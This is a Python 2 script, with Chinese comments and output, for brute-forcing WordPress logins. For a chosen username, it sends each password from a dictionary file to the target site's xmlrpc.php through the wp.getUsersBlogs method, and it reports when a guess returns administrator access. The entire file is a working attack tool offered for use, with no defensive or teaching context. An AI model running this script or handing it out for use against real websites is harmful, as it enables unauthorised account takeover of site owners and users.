#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Date: 2015/4/29
# Created by 独自等待
# 博客 http://www.waitalone.cn/
import os
import sys
import time
import urllib2


def usage():
    os.system(['clear', 'cls'][os.name == 'nt'])
    print '+' + '-' * 50 + '+'
    print '\t Python WordPress暴力破解工具单线程版'
    print '\t   Blog：http://www.waitalone.cn/'
    print '\t       Code BY： 独自等待'
    print '\t       Time：2015-04-29'
    print '+' + '-' * 50 + '+'
    if len(sys.argv) != 4:
        print '用法: ' + os.path.basename(sys.argv[0]) + '  用户名  密码字典  待破解的网站URL地址  '
        print '实例: ' + os.path.basename(sys.argv[0]) + '  admin  pass.txt http://www.waitalone.cn/ '
        sys.exit()


def crack(password):
    """
    WordPress xmlrpc暴力破解
    """
    crack_url = url + 'xmlrpc.php'
    post = '''
        <?xml version="1.0" encoding="iso-8859-1"?>
        <methodCall>
          <methodName>wp.getUsersBlogs</methodName>
          <params>
           <param><value>''' + username + '''</value></param>
           <param><value>''' + password + '''</value></param>
          </params>
        </methodCall>
    '''
    header = {
        'UserAgent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
        'Referer': crack_url
    }
    try:
        req = urllib2.Request(crack_url, data=post, headers=header)
        res = urllib2.urlopen(req, timeout=10).read().decode(
            'utf-8').encode('GBK')
    except Exception, msg:
        print '爷,发生错误了!', msg
    else:
        if '<int>405</int>' in res:
            print '[×] 报告爷,此站点已禁用XML-RPC服务!'
            sys.exit('\n[!] 卧槽,这么快就执行完了?用时：%s 秒' % (time.time() - start))
        elif 'faultCode' in res:
            print '[×] 报告爷,正在尝试密码:', password
        elif 'isAdmin' in res:
            print '\n[√] 报告爷,密码破解成功:', password
            sys.exit('\n[!] 卧槽,这么快就执行完了?用时：%s 秒' % (time.time() - start))


if __name__ == '__main__':
    usage()
    username = sys.argv[1]
    url = sys.argv[3]
    if url[-1] != '/':
        url += '/'
    print '[√] 目标：', url + '\n'
    start = time.time()
    if os.path.isfile(sys.argv[2]):
        passlist = [x.strip() for x in open(sys.argv[2])]
        print '[√] 报告爷,共有密码[ %d ]行!\n' % len(passlist)
        try:
            for password in passlist:
                crack(password)
        except KeyboardInterrupt:
            print '\n[!] 爷,按您的吩咐,已成功退出!'
    else:
        print '[X] 爷,没找到密码字典,破解个毛呀?'
